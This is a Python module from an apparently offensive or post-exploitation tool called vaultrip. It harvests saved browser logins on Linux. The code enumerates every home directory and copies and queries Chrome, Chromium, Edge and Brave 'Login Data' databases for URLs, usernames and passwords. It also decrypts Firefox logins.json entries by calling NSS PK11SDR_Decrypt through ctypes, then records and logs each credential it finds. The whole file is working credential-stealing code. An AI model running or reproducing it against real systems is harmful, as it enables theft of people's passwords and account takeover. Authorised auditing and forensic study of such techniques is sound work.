# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Browser credential extraction.

Chrome/Chromium/Edge/Brave: reads the SQLite "Login Data" database.
Firefox: reads logins.json + key4.db via NSS (if available) or records
         encrypted blobs without decryption when NSS is unavailable.

On Linux, Chrome uses the system keyring (GNOME/kwallet) to store the
encryption key — if the keyring isn't unlocked, passwords remain encrypted.
"""

from __future__ import annotations

import glob
import json
import logging
import os
import shutil
import sqlite3
import tempfile

from ..reporter import BrowserCredFinding, ScanResult
from .passive import PassiveInfo

log = logging.getLogger("vaultrip.browser")


def run(result: ScanResult, passive: PassiveInfo) -> None:
    """Extract saved credentials from all accessible browser stores."""
    for home in passive.home_dirs:
        _scan_chrome_family(result, home)
        _scan_firefox(result, home)


# ---------------------------------------------------------------------------
# Chrome / Chromium / Edge / Brave
# ---------------------------------------------------------------------------

_CHROME_PROFILES = [
    (".config/google-chrome",                            "chrome"),
    (".config/chromium",                                 "chromium"),
    (".config/microsoft-edge",                           "edge"),
    (".config/BraveSoftware/Brave-Browser",              "brave"),
    ("snap/chromium/current/.config/chromium",           "chromium"),
    ("snap/brave/current/.config/BraveSoftware/Brave-Browser", "brave"),
]


def _scan_chrome_family(result: ScanResult, home: str) -> None:
    for rel_dir, browser_name in _CHROME_PROFILES:
        base = os.path.join(home, rel_dir)
        if not os.path.isdir(base):
            continue
        # Each profile is a sub-directory containing "Login Data"
        for profile_dir in [base] + [
            os.path.join(base, d)
            for d in os.listdir(base)
            if os.path.isdir(os.path.join(base, d))
        ]:
            login_db = os.path.join(profile_dir, "Login Data")
            if os.path.isfile(login_db):
                _read_chrome_db(result, login_db, browser_name)


def _read_chrome_db(result: ScanResult, db_path: str, browser: str) -> None:
    """Copy the SQLite database to a temp file (Chrome locks it) and read it."""
    try:
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp:
            tmp_path = tmp.name
        shutil.copy2(db_path, tmp_path)
    except OSError as exc:
        log.debug("chrome: cannot copy %s: %s", db_path, exc)
        return

    try:
        con = sqlite3.connect(f"file:{tmp_path}?mode=ro", uri=True)
        cur = con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        )
        for url, username, password_blob in cur.fetchall():
            password = _decrypt_chrome_password(password_blob)
            result.append_browser(BrowserCredFinding(
                browser=browser,
                url=url,
                username=username,
                password=password,
            ))
            log.info("browser: %s login found for %s (%s)", browser, url, username)
        con.close()
    except sqlite3.Error as exc:
        log.debug("chrome: db error in %s: %s", db_path, exc)
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def _decrypt_chrome_password(blob: bytes) -> str | None:
    """Attempt to decrypt a Chrome password blob.

    On Linux, Chrome v80+ uses AES-256-GCM with a key stored in the system
    keyring. Without the keyring, we can only detect and report the blob.
    Pre-v80 blobs have no prefix and were stored unencrypted.
    """
    if not blob:
        return None
    if blob.startswith(b"v10") or blob.startswith(b"v11"):
        # AES-256-GCM — key is in GNOME keyring / kwallet
        # Return None here; system.py will attempt keyring extraction
        return None
    try:
        return blob.decode("utf-8")
    except (UnicodeDecodeError, AttributeError):
        return None


# ---------------------------------------------------------------------------
# Firefox
# ---------------------------------------------------------------------------

_FIREFOX_BASE_DIRS = [
    ".mozilla/firefox",
    "snap/firefox/common/.mozilla/firefox",
    ".var/app/org.mozilla.firefox/.mozilla/firefox",
]


def _scan_firefox(result: ScanResult, home: str) -> None:
    for rel_dir in _FIREFOX_BASE_DIRS:
        base = os.path.join(home, rel_dir)
        if not os.path.isdir(base):
            continue
        for profile_dir in _firefox_profiles(base):
            _read_firefox_profile(result, profile_dir)


def _firefox_profiles(base: str) -> list[str]:
    profiles = []
    profiles_ini = os.path.join(base, "profiles.ini")
    if os.path.isfile(profiles_ini):
        import configparser
        cfg = configparser.ConfigParser()
        cfg.read(profiles_ini)
        for section in cfg.sections():
            if not section.startswith("Profile"):
                continue
            path = cfg.get(section, "Path", fallback="")
            is_relative = cfg.getboolean(section, "IsRelative", fallback=True)
            if path:
                full = os.path.join(base, path) if is_relative else path
                if os.path.isdir(full):
                    profiles.append(full)
    # Fallback: glob for *.default* dirs
    if not profiles:
        profiles = glob.glob(os.path.join(base, "*.default*"))
    return profiles


def _read_firefox_profile(result: ScanResult, profile_dir: str) -> None:
    logins_json = os.path.join(profile_dir, "logins.json")
    if not os.path.isfile(logins_json):
        return

    try:
        with open(logins_json) as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        log.debug("firefox: cannot read logins.json in %s: %s", profile_dir, exc)
        return

    for entry in data.get("logins", []):
        hostname = entry.get("hostname", "")
        username_field = entry.get("encryptedUsername", "")
        password_field = entry.get("encryptedPassword", "")

        # Attempt NSS decryption (requires nss3 / python-nss)
        username, password = _decrypt_firefox_nss(profile_dir, username_field, password_field)

        result.append_browser(BrowserCredFinding(
            browser="firefox",
            url=hostname,
            username=username or f"<encrypted:{username_field[:20]}...>",
            password=password,
        ))
        log.info("browser: firefox login found for %s", hostname)


def _decrypt_firefox_nss(
    profile_dir: str,
    enc_username: str,
    enc_password: str,
) -> tuple[str | None, str | None]:
    """Attempt decryption via ctypes libnss3. Returns (username, password) or (None, None)."""
    try:
        import base64
        import ctypes
        import ctypes.util

        nss_path = ctypes.util.find_library("nss3")
        if not nss_path:
            return None, None

        nss = ctypes.CDLL(nss_path)
        nss.NSS_Init(profile_dir.encode())

        class SECItem(ctypes.Structure):
            _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]

        def _decrypt_field(enc_b64: str) -> str | None:
            raw = base64.b64decode(enc_b64)
            decoded = SECItem()
            encoded = SECItem(data=raw, len=len(raw))
            result_code = nss.PK11SDR_Decrypt(ctypes.byref(encoded), ctypes.byref(decoded), None)
            if result_code == 0 and decoded.data:
                return decoded.data[:decoded.len].decode("utf-8", errors="replace")
            return None

        username = _decrypt_field(enc_username) if enc_username else None
        password = _decrypt_field(enc_password) if enc_password else None
        nss.NSS_Shutdown()
        return username, password
    except Exception:
        return None, None
